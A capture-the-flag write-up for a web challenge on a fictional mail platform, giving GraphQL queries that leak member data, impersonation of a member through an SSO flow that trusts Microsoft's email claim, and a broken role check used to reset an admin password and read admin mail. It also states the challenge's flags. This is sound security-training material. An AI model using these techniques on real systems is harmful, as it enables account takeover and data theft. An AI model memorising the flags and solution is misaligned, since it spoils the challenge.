# rEquestria Challenge

**Category:** Web / GraphQL / OAuth
**Flags:**

- `SK-CERT{l34ky_l34ks_4ll_0v3r_3questria}`
- `SK-CERT{w3ll_s0m3t1m3s_ss0_1s_not_th3_b3st_s0lut10n}`
- `SK-CERT{nil_1s_l4rg3r_th4n_3qu3str1a}`

---

## Description

A fictional society's internal mail platform. A GraphQL API. A Microsoft SSO button. Three flags spread across different access levels, each requiring a different exploit chain.

The challenge hands you a login page and a React application. No credentials upfront. But if you know where to dig, the surface area is generous.

---

## Step 1: Reconnaissance

Before touching anything, you need to understand what you're working with.

Hit the root and catalog what comes back:

```
GET https://mail.equestriasociety.com/
```

Minimal HTML shell. One script tag pulling `/static/js/main.36c9c96c.js`.

The whole app is a React SPA. Everything lives in that bundle. Download and unpack it.

Inside the JavaScript, two things jump out immediately.

First:

```
GraphQL endpoint: /graphql
Source download: /download/source  (bearer token required)
```

Second, check for the source map:

```
GET /static/js/main.36c9c96c.js.map  ->  200 OK  (3.4 MB)
```

A 3.4 MB source map sitting unguarded. That's basically source code disclosure. Pull it and parse out the GraphQL operations:

```
MESSAGES_QUERY
USERS_QUERY
SEND_MESSAGE_MUTATION
GET_USER_CREDENTIALS_MUTATION
CREATE_USER_MUTATION
UPDATE_USER_MUTATION
UPDATE_PROFILE_MUTATION
CREATE_SSO_CONFIGURATION_MUTATION
ME_QUERY
NewsFeed
```

Now you have a complete attack surface before sending a single authenticated request. That's a major win.

---

## Step 2: GraphQL Introspection

Start with the GraphQL endpoint. Test it with a basic query:

```graphql
query {
	__typename
}
```

Returns `RootQueryType`. No auth required. Good sign.

Now run a full introspection to map what's public vs what's gated:

```graphql
query {
	__schema {
		queryType {
			fields {
				name
				description
			}
		}
	}
}
```

The API breaks down into:

```
newsFeed                  - public (no auth)
enabledSsoConfigurations  - public (no auth)
me                        - requires auth
messages                  - admin only
users                     - admin only
ssoConfigurations         - admin only
```

The obvious attack surface is `newsFeed`. It's public, and in GraphQL that means you can traverse all relationships hanging off it. Most developers forget that GraphQL doesn't automatically restrict traversal depth. You just ask for what you want and if no auth is on the path, you get it.

---

## Step 3: Leaking Member Data

Query `newsFeed` without any auth:

```graphql
query {
	newsFeed {
		id
		title
		content
		author {
			id
			name
			email
			role
		}
	}
}
```

Returns four public posts with full author details. More than intended already.

But the `User` type has a `subOrganization` field — and `SubOrganization` has a `members` field. Follow the chain:

```graphql
query {
	newsFeed {
		author {
			subOrganization {
				name
				members {
					email
					role
				}
			}
		}
	}
}
```

The API dumps back a full member list without asking for authentication:

```
luna.starlight@equestriasociety.com     (role 2 - admin)
luna.belle@equestriasociety.com         (role 2 - admin)
rose.garden@equestriasociety.com        (role 1 - reporter)
friends@equestriasociety.com            (role 0 - member)
starswirl.helper@equestriasociety.com   (role 2 - admin)
moon.dancer@equestriasociety.com        (role 2 - admin)
twilight.scholar@equestriasociety.com   (role 0 - member)
fluttershy.quiet@equestriasociety.com   (role 0 - member)
```

Buried in that list alongside legitimate members:

```
SK-CERT{l34ky_l34ks_4ll_0v3r_3questria}@lol.com
```

**Flag 1 found.** The backend exposed member data. It used an unprotected traversal path. Save the full member list. You'll use it later.

---

## Step 4: OAuth Chain Analysis

Now pivot to the login side. Click the Microsoft SSO button and see what happens.

The browser redirects to Microsoft:

```
GET /auth/microsoft
->  302 to https://login.microsoftonline.com/common/oauth2/v2.0/authorize?
    client_id=30ad782c-2190-4a15-bd42-a78181960499
    &redirect_uri=https://mail.equestriasociety.com/auth/microsoft/callback
    &scope=openid+email+profile+User.Read
    &response_type=code
```

Study that URL carefully. Two critical things are missing. Look for `state` and `nonce`. There's no CSRF protection on the OAuth flow. The more interesting question is what happens next. How does the backend validate the Microsoft identity?

Test the callback endpoint with a fake code:

```
GET /auth/microsoft/callback?code=abc
->  302 to /login?error=token_exchange_failed
```

The backend is doing server-side code exchange. Set up a proxy. Go through a real Microsoft login. Capture the actual callback redirect. After the exchange completes you'll see:

```
/login?error=unauthorized&email=<YOUR_MICROSOFT_EMAIL>
```

The backend is echoing back whatever email comes from the Microsoft token. It uses that email to check membership. There's no domain validation. No additional verification. If you can get a Microsoft account with a member email in it, you're in.

This is the NoAuth vulnerability in Microsoft Azure AD. See the detailed breakdown here: https://www.crowdstrike.com/en-us/blog/noauth-microsoft-azure-ad-vulnerability/

The backend trusts the email claim from Microsoft. It doesn't verify the account actually exists in the target Microsoft tenant.

---

## Step 5: Exploiting Entra External ID

You need a Microsoft account where the `mail` attribute is set to a member's email from your leaked list.

Personal Microsoft consumer accounts (live.com) won't let you set custom mail attributes. Tenant creation requires phone verification or a paid license. The M365 Developer Program is also gated behind phone verification.

But Microsoft Entra External ID works. Create a cloud user in an External ID tenant. Those users can have arbitrary `mail` attributes set in the Azure portal.

Test with a dummy value first to confirm the reflection:

```
Set mail attribute = test1@yourdomain.com
Go through Microsoft SSO on the site
Observe: /login?error=unauthorized&email=test1@yourdomain.com
```

The backend echoes your mail attribute back. The trust chain is confirmed.

Now pick a target from your leaked member list. Try the admin first:

```
Set mail attribute = luna.starlight@equestriasociety.com
```

Redirect from the OAuth flow... returns:

```
/login?error=sso_not_allowed_for_role
```

The backend blocks admins and reporters from SSO login entirely. Their role is too high for this attack vector.

Looking at the member list, the low-privilege accounts are:

```
friends@equestriasociety.com        (role 0)
twilight.scholar@equestriasociety.com (role 0)
fluttershy.quiet@equestriasociety.com (role 0)
```

Set your Entra user's mail to `fluttershy.quiet@equestriasociety.com` and run the OAuth flow again.

Login succeeds. You're in as a regular member.

The site UI had a **Download source code** button that had not been visible before. I clicked it and a zip archive downloaded. Inside was `flag.txt`:

```
SK-CERT{w3ll_s0m3t1m3s_ss0_1s_not_th3_b3st_s0lut10n}
```

---

## Step 6: Source Code Download & Analysis

Now you're authenticated as a member. The **Download source code** button appears in the UI. Download the zip archive.

Inside is a complete backend codebase. It's Elixir and Phoenix. Read through it methodically.

First thing in `config/config.exs`. Also confirmed in `docker-compose.yml`:

```
SECRET_KEY_BASE = "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
```

Sixty-four `a` characters. This is the Guardian JWT signing secret. If production uses the same default, you can forge any token. That includes admin tokens.

From the earlier member list, you know the admin UUIDs.

First admin:

```
luna.starlight@equestriasociety.com  ->  d0775fe2-c40e-4af4-a598-2a51f4cc7453
```

Second admin:

```
starswirl.helper@equestriasociety.com -> 066ced4d-d259-4864-a1f5-df8db206e2f6
```

Decode your own fluttershy token to see the JWT structure.

You should see:

```
alg: HS512
aud: requestria
iss: requestria
typ: access
sub: <your fluttershy UUID>
```

Now forge an HS512 token with luna.starlight's UUID and the default `aaaa...` secret. Send it to `/graphql`:

```graphql
query {
	me {
		id
		email
		role
	}
}
```

Response: `Not authenticated`

Production deployed a different secret. JWT forging won't work. But you still have the source code. Keep reading.

---

## Step 7: Type Coercion in Role Guards

Keep reading the source. In `lib/requestria_web/resolvers/news.ex` the role authorization looks like this:

```elixir
if current_user.role == "admin" do
  ...
end
```

And in the migrations at `priv/repo/migrations/20260122000000_initial_schema.exs`:

```elixir
add :role, :integer, default: 0
```

Roles are stored as integers. `0` means member. `1` means reporter. `2` means admin.

But the resolver is comparing an integer to a string literal `"admin"`. In Elixir that comparison is always false. The role guard is completely broken.

Every mutation marked as "admin only" is actually callable by any authenticated user. Your low-privilege fluttershy token can execute admin operations without any restriction.

Look back at the mutation list. `updateUser` is marked as admin-only in the description. Call it with your fluttershy Bearer token:

```graphql
mutation {
	updateUser(
		id: "852f35e8-7e71-40ad-87a9-8a624d5dbe8e"
		email: "luna.starlight@equestriasociety.com"
		password: "P@ssw0rd123!"
	) {
		id
		email
		role
	}
}
```

Response:

```json
{
	"data": {
		"updateUser": {
			"email": "luna.starlight@equestriasociety.com",
			"id": "852f35e8-7e71-40ad-87a9-8a624d5dbe8e",
			"role": 2
		}
	}
}
```

It went through. You just reset an admin's password from a member account.

---

## Step 8: Escalation to Admin

Now that you control luna.starlight's password, log in with it:

```graphql
mutation {
	login(
		email: "luna.starlight@equestriasociety.com"
		password: "P@ssw0rd123!"
	) {
		token
		user {
			id
			email
			role
		}
	}
}
```

Get back a valid admin JWT. Role 2 confirmed.

Use it to query the admin inbox:

```graphql
query {
	messages {
		id
		subject
		body
		sender {
			email
			name
		}
		insertedAt
	}
}
```

Five internal council messages in the inbox. They cover ransomware infrastructure, breach post-mortems, cover-ups, and damage control. Read through all of them.

The one that matters is from `luna.belle@equestriasociety.com`. The subject is `Re: [COUNCIL ONLY] Q1 Progress - Operation Eternal Eclipse`. The message body ends with:

```
Dark Luna
SK-CERT{nil_1s_l4rg3r_th4n_3qu3str1a}
```

**Flag 3 found.**

